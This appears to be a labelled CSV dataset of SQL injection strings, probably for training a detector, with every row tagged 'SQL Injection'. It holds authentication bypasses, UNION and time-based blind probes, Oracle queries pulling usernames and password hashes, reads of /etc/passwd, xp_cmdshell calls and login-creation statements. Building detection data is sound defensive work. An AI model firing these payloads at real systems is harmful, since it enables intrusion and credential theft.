Script,Label
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",SQL Injection
admin'  )   or   (  '1'  =  '1,SQL Injection
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,SQL Injection
"or 0  =  0 #""",SQL Injection
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",SQL Injection
  )   or   (  'x'  =  'x,SQL Injection
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",SQL Injection
$  (  sleep 50  ) ,SQL Injection
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",SQL Injection
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",SQL Injection
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",SQL Injection
"""a"""" or 1  =  1--""",SQL Injection
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",SQL Injection
1 and user_name  (    )     =   'dbo',SQL Injection
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",SQL Injection
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",SQL Injection
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',SQL Injection
select * from users where id  =  1 +$+. or 1  =  1 -- 1,SQL Injection
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SQL Injection
or 1  =  1 or ''  =  ',SQL Injection
select * from users where id  =  1   or 1  =  1 -- 1,SQL Injection
or 'text' > 't',SQL Injection
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",SQL Injection
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",SQL Injection
admin' or '1'  =  '1'#,SQL Injection
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,SQL Injection
s,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",SQL Injection
 select * from information_schema.tables--,SQL Injection
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",SQL Injection
1   )    )    or pg_sleep  (  __TIME__  )  --,SQL Injection
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",SQL Injection
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,SQL Injection
 or 1  =  1 or ''  =  ',SQL Injection
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,SQL Injection
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,SQL Injection
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",SQL Injection
or 'unusual'   =   'unusual',SQL Injection
 or 1 in   (  select @@version  )  --,SQL Injection
truncate,SQL Injection
as,SQL Injection
 or 3  =  3 --,SQL Injection
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",SQL Injection
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",SQL Injection
"admin""  )   or   (  ""1""  =  ""1",SQL Injection
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",SQL Injection
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",SQL Injection
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",SQL Injection
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,SQL Injection
" or 0  =  0 #""",SQL Injection
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,SQL Injection
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,SQL Injection
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",SQL Injection
1  )   or sleep  (  __TIME__  )  #,SQL Injection
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",SQL Injection
select * from users where id  =  1. <@ or 1  =  1 -- 1,SQL Injection
 or true--,SQL Injection
; execute immediate 'sel' || 'ect us' || 'er',SQL Injection
hi' or 'x'  =  'x';,SQL Injection
select * from users where id  =  1 <@ or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",SQL Injection
admin' #,SQL Injection
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",SQL Injection
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",SQL Injection
"""  )  ;waitfor delay '0:0:__TIME__'--",SQL Injection
 or 'unusual'   =   'unusual',SQL Injection
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",SQL Injection
"admin"" or ""1""  =  ""1""/*",SQL Injection
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",SQL Injection
like,SQL Injection
or username like char  (  37  )  ;,SQL Injection
 )    )    or pg_sleep  (  __TIME__  )  --,SQL Injection
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,SQL Injection
or 3  =  3,SQL Injection
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",SQL Injection
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,SQL Injection
exec sp,SQL Injection
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",SQL Injection
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",SQL Injection
admin' or 1  =  1/*,SQL Injection
a' waitfor delay '0:0:10'--,SQL Injection
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",SQL Injection
and 1 in   (  select var from temp  )  --,SQL Injection
hi'  )   or   (  'a'  =  'a,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",SQL Injection
"admin"" or 1  =  1",SQL Injection
"""  )   or true--",SQL Injection
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",SQL Injection
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",SQL Injection
1  )   or pg_sleep  (  __TIME__  )  --,SQL Injection
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",SQL Injection
"""  )   or sleep  (  __TIME__  )    =  """,SQL Injection
select * from users where id  =  1.<@. or 1  =  1 -- 1,SQL Injection
"admin""  )   or   (  ""1""  =  ""1""--",SQL Injection
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",SQL Injection
; exec xp_regread,SQL Injection
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",SQL Injection
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",SQL Injection
1 and 1  =  1,SQL Injection
or 0  =  0 #,SQL Injection
union select * from users where login   =   char ...,SQL Injection
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",SQL Injection
admin'  )   or '1'  =  '1'--,SQL Injection
1;SELECT *,SQL Injection
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",SQL Injection
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,SQL Injection
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",SQL Injection
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",SQL Injection
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",SQL Injection
procedure,SQL Injection
or ''  =  ',SQL Injection
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",SQL Injection
\'; desc users; --,SQL Injection
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",SQL Injection
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',SQL Injection
""" or """"^""",SQL Injection
"""-""",SQL Injection
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",SQL Injection
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",SQL Injection
admin'/*,SQL Injection
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",SQL Injection
||UTL_HTTP.REQUEST,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",SQL Injection
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",SQL Injection
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",SQL Injection
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',SQL Injection
1 uni/**/on select all from where,SQL Injection
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",SQL Injection
admin'  )   or '1'  =  '1'#,SQL Injection
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',SQL Injection
or '7659'  =  '7659,SQL Injection
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",SQL Injection
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",SQL Injection
or true--,SQL Injection
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",SQL Injection
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",SQL Injection
""" or true--",SQL Injection
select * from users where id  =  1. or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",SQL Injection
â or 3  =  3 --,SQL Injection
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,SQL Injection
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",SQL Injection
 or uid like '%,SQL Injection
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',SQL Injection
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",SQL Injection
23 or 1  =  1; --,SQL Injection
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",SQL Injection
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",SQL Injection
0 or 1  =  1,SQL Injection
select * from users where id  =  1 &@ or 1  =  1 -- 1,SQL Injection
"admin""  )   or ""1""  =  ""1",SQL Injection
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",SQL Injection
&apos; OR,SQL Injection
sqlvuln;,SQL Injection
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,SQL Injection
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',SQL Injection
""" or """"*""",SQL Injection
"hi or 1  =  1 --""",SQL Injection
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",SQL Injection
; exec master..xp_cmdshell 'ping 172.10.1.255'--,SQL Injection
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",SQL Injection
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",SQL Injection
select * from information_schema.tables--,SQL Injection
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,SQL Injection
   (  select top 1,SQL Injection
Ã½ or 1  =  1 --,SQL Injection
a' --,SQL Injection
 or 1  =  1 /*,SQL Injection
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",SQL Injection
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",SQL Injection
--,SQL Injection
"exec sp_addlogin 'name' , 'password'",SQL Injection
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",SQL Injection
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,SQL Injection
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",SQL Injection
group by userid having 1  =  1--,SQL Injection
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",SQL Injection
select * from users where id  =  1 *1 or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",SQL Injection
‘ or 1  =  1 --,SQL Injection
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",SQL Injection
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,SQL Injection
or 'a'  =  'a,SQL Injection
declare @s varchar  (  22  )   select @s   = ,SQL Injection
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",SQL Injection
@variable,SQL Injection
; exec master..xp_cmdshell,SQL Injection
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",SQL Injection
 and 1 in   (  select var from temp  )  --,SQL Injection
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",SQL Injection
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",SQL Injection
or x  =  x,SQL Injection
or a  =  a,SQL Injection
or '1'  =  '1,SQL Injection
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",SQL Injection
   )    )    or    (    (   'x'   )    )     =     (    (   'x,SQL Injection
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",SQL Injection
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",SQL Injection
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,SQL Injection
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",SQL Injection
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",SQL Injection
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",SQL Injection
a' or 1  =  1--,SQL Injection
 )   or   (  a  =  a,SQL Injection
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",SQL Injection
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",SQL Injection
-- &password  = ,SQL Injection
select * from users where id  =  1 <@. or 1  =  1 -- 1,SQL Injection
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",SQL Injection
 or '1'  =  '1,SQL Injection
admin' or 1  =  1,SQL Injection
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",SQL Injection
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",SQL Injection
" union select * from users where login   =   char  (  114,111,111,116  )  ;",SQL Injection
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",SQL Injection
 or 1  =  1--,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",SQL Injection
pg_sleep  (  __TIME__  )  --,SQL Injection
‘ or 3  =  3 --,SQL Injection
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",SQL Injection
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",SQL Injection
 )   union select * from information_schema.tables;,SQL Injection
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",SQL Injection
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",SQL Injection
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,SQL Injection
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",SQL Injection
""" or """" """,SQL Injection
delete,SQL Injection
;waitfor delay '0:0:__TIME__'--,SQL Injection
 or 1  =  1 --,SQL Injection
1' and non_existant_table   =   '1,SQL Injection
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",SQL Injection
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",SQL Injection
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,SQL Injection
x' AND userid IS NULL; --,SQL Injection
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",SQL Injection
